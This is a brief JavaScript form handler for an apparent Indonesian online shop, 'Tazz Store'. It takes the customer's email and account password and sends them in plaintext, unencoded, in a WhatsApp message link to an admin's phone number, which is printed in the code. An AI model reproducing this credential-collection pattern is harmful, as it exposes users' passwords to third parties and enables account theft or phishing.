// Handle submit form
document.getElementById("orderForm").addEventListener("submit", function(e) {
  e.preventDefault();

  let email = document.querySelector("input[type='email']").value;
  let password = document.querySelector("input[type='password']").value;

  // Buat pesan WhatsApp otomatis
  let pesan = `Halo Admin, saya ingin order di Tazz Store:%0A
Email: ${email}%0A
Password: ${password}%0A
Saya sudah siap melakukan pembayaran via Dana ke 085709518077.`;

  // Arahkan ke WhatsApp Admin
  window.open(`https://wa.me/6285709518077?text=${pesan}`, "_blank");
});